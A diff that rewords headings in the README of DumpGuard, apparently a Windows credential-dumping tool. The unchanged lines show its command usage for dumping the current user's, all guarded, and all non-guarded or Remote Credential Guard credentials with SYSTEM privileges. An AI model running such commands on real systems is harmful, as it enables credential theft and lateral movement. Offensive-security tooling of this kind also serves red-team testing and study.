@@ -7,12 +7,12 @@
 DumpGuard.exe /mode:self /domain:<DOMAIN> /username:<SAMACCOUNTNAME> /password:<PASSWORD>
 ```
 
-## Dumping All Guarded Credentials (SYSTEM Required)
+## Dumping All Guarded Credentials (Requires SYSTEM Privileges)
 ```
 DumpGuard.exe /mode:all /domain:<DOMAIN> /username:<SAMACCOUNTNAME> /password:<PASSWORD>
 ```
 
-## Dumping All Non-Guarded or RCG Credentials (SYSTEM Required)
+## Dumping All Non-Guarded or RCG Credentials (Requires SYSTEM Privileges)
 ```
 DumpGuard.exe /mode:all
 ```
